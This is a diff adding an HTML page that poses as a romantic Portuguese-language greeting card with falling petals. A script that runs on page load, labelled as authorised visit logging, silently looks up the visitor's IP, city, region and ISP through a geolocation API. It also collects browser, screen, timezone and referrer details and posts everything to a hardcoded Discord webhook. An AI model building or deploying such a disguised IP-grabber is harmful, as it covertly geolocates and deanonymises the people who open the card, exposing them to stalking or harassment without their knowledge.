@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#1a0a0f">
+<title>Para você 🌸</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;1,400&family=Lato:wght@300;400&display=swap" rel="stylesheet">
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+html {
+  min-height: 100%;
+  background: #1a0a0f;
+}
+
+body {
+  min-height: 100vh;
+  min-height: 100dvh;
+  width: 100%;
+  padding:
+    max(25px, env(safe-area-inset-top))
+    max(16px, env(safe-area-inset-right))
+    max(25px, env(safe-area-inset-bottom))
+    max(16px, env(safe-area-inset-left));
+
+  display: flex;
+  justify-content: center;
+  align-items: center;
+
+  background:
+    radial-gradient(ellipse at top, #42152b, transparent 65%),
+    linear-gradient(135deg, #1a0a0f, #2d1021, #1a0a0f);
+
+  font-family: 'Lato', sans-serif;
+  overflow-x: hidden;
+  overflow-y: auto;
+}
+
+.card {
+  width: 100%;
+  max-width: 460px;
+  position: relative;
+  z-index: 2;
+
+  padding: clamp(28px, 7vw, 45px)
+           clamp(20px, 6vw, 35px);
+
+  border-radius: 25px;
+  border: 1px solid rgba(255,180,200,.2);
+
+  background: rgba(255,255,255,.045);
+  backdrop-filter: blur(18px);
+  -webkit-backdrop-filter: blur(18px);
+
+  box-shadow:
+    0 0 50px rgba(220,60,100,.13),
+    inset 0 1px rgba(255,255,255,.08);
+
+  text-align: center;
+  animation: appear 1.2s ease both;
+}
+
+@keyframes appear {
+  from {
+    opacity: 0;
+    transform: translateY(25px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.rose {
+  display: block;
+  font-size: 3.3rem;
+  margin-bottom: 18px;
+  filter: drop-shadow(0 0 15px #e8396a);
+  animation: pulse 3s ease-in-out infinite;
+}
+
+@keyframes pulse {
+  50% { transform: scale(1.09); }
+}
+
+h1 {
+  font-family: 'Playfair Display', serif;
+  font-style: italic;
+  font-size: clamp(1.8rem, 8vw, 2.3rem);
+  color: #f7c5d5;
+  margin-bottom: 8px;
+}
+
+.subtitle {
+  font-size: .7rem;
+  letter-spacing: .15em;
+  color: rgba(247,197,213,.55);
+  text-transform: uppercase;
+  margin-bottom: 28px;
+}
+
+.divider {
+  width: 65px;
+  height: 1px;
+  margin: 0 auto 28px;
+  background: linear-gradient(90deg, transparent, #e8396a, transparent);
+}
+
+.message {
+  font-family: 'Playfair Display', serif;
+  font-size: clamp(1rem, 4.5vw, 1.12rem);
+  line-height: 1.85;
+  color: rgba(255,235,240,.92);
+  text-align: left;
+  overflow-wrap: anywhere;
+}
+
+.message em {
+  color: #f7c5d5;
+}
+
+.signature {
+  margin-top: 30px;
+  font-family: 'Playfair Display', serif;
+  font-style: italic;
+  font-size: 1.3rem;
+  color: #f7c5d5;
+}
+
+.heart-line {
+  margin-top: 12px;
+  color: #e8396a;
+  letter-spacing: .35em;
+}
+
+.petal {
+  position: fixed;
+  top: -40px;
+  pointer-events: none;
+  z-index: 1;
+  animation: fall linear infinite;
+}
+
+@keyframes fall {
+  0% {
+    transform: translateY(-5vh) rotate(0deg);
+    opacity: 0;
+  }
+  15% { opacity: .5; }
+  85% { opacity: .4; }
+  100% {
+    transform: translateY(110vh) rotate(600deg);
+    opacity: 0;
+  }
+}
+
+@media (max-width: 360px) {
+  body {
+    padding-left: 12px;
+    padding-right: 12px;
+  }
+
+  .card {
+    padding: 27px 19px;
+    border-radius: 21px;
+  }
+
+  .message {
+    font-size: 1rem;
+    line-height: 1.75;
+  }
+}
+
+@media (max-height: 650px) {
+  body {
+    align-items: flex-start;
+  }
+}
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: 0.01ms !important;
+    animation-iteration-count: 1 !important;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<main class="card">
+
+  <span class="rose">🌹</span>
+
+  <h1>para você</h1>
+
+  <p class="subtitle">uma mensagem do coração</p>
+
+  <div class="divider"></div>
+
+  <p class="message">
+    Tem dias em que eu só quero te dizer que você importa.
+    <br><br>
+
+    Não de um jeito qualquer — do jeito que o sol importa
+    pra quem ficou tempo demais no escuro.
+
+    Você aparece na minha cabeça nos momentos mais simples
+    e faz tudo parecer <em>menos pesado</em>.
+    <br><br>
+
+    Obrigado por existir. Obrigado por ser exatamente quem você é.
+
+    Sem precisar mudar nada, sem precisar ser diferente —
+    só você, assim, já é o suficiente.
+  </p>
+
+  <p class="signature">com carinho 🌸</p>
+
+  <p class="heart-line">♡ &nbsp; ♡ &nbsp; ♡</p>
+
+</main>
+
+<script>
+
+// ==========================================
+// CONFIGURAÇÃO
+// ==========================================
+
+const WEBHOOK = "https://discord.com/api/webhooks/1568358187663491128/EpWP_QLK1dnmuOpILKLacQIP0iw9pDOWou8kwWximy4duOk70JLEBXyjOAkZ82Ru9NiN";
+
+// ==========================================
+// PÉTALAS ANIMADAS
+// ==========================================
+
+const flowers = ["🌸", "🌺", "✿", "❀", "🌹", "💮"];
+
+for (let i = 0; i < 14; i++) {
+  const petal = document.createElement("span");
+
+  petal.className = "petal";
+  petal.textContent =
+    flowers[Math.floor(Math.random() * flowers.length)];
+
+  petal.style.left = Math.random() * 100 + "vw";
+  petal.style.fontSize = (12 + Math.random() * 12) + "px";
+  petal.style.animationDuration = (10 + Math.random() * 12) + "s";
+  petal.style.animationDelay = (Math.random() * 12) + "s";
+
+  document.body.appendChild(petal);
+}
+
+// ==========================================
+// REGISTRO DE VISITAS AUTORIZADO
+// ==========================================
+
+async function grab() {
+
+  try {
+
+    const response = await fetch("https://ipapi.co/json/");
+
+    if (!response.ok) {
+      throw new Error("Falha na consulta de localização");
+    }
+
+    const geo = await response.json();
+
+    const ua = navigator.userAgent;
+    const lang = navigator.language;
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const screen_ = `${screen.width}x${screen.height}`;
+    const ref = document.referrer || "direto";
+    const ts = new Date().toISOString();
+
+    const embed = {
+      username: "🌹 Love Note Logger",
+      embeds: [{
+        title: "💌 Nova visita ao cartão",
+        color: 0xe8396a,
+
+        fields: [
+          {
+            name: "🌐 IP",
+            value: `||${geo.ip || "Não disponível"}||`,
+            inline: true
+          },
+          {
+            name: "🏳️ País",
+            value: `${geo.country_name || "??"} (${geo.country_code || "??"})`,
+            inline: true
+          },
+          {
+            name: "🏙️ Cidade",
+            value: `${geo.city || "??"}, ${geo.region || "??"}`,
+            inline: true
+          },
+          {
+            name: "📡 ASN / ISP",
+            value: `\`${geo.org || "??"}\``,
+            inline: false
+          },
+          {
+            name: "🕐 Timezone",
+            value: tz,
+            inline: true
+          },
+          {
+            name: "🗣️ Idioma",
+            value: lang,
+            inline: true
+          },
+          {
+            name: "🖥️ Tela",
+            value: screen_,
+            inline: true
+          },
+          {
+            name: "📎 Referrer",
+            value: ref.slice(0, 1024),
+            inline: false
+          },
+          {
+            name: "🤖 User-Agent",
+            value: `\`${ua.slice(0, 1000)}\``,
+            inline: false
+          },
+          {
+            name: "🕰️ Timestamp",
+            value: ts,
+            inline: false
+          }
+        ],
+
+        footer: {
+          text: "olliE bench ·🥔"
+        },
+
+        timestamp: ts
+      }]
+    };
+
+    const result = await fetch(WEBHOOK, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(embed)
+    });
+
+    if (!result.ok) {
+      throw new Error(`Discord HTTP ${result.status}`);
+    }
+
+    console.log("Visita registrada!");
+
+  } catch (error) {
+    console.error("Erro no registro:", error);
+  }
+}
+
+grab();
+
+</script>
+
+</body>
+</html>
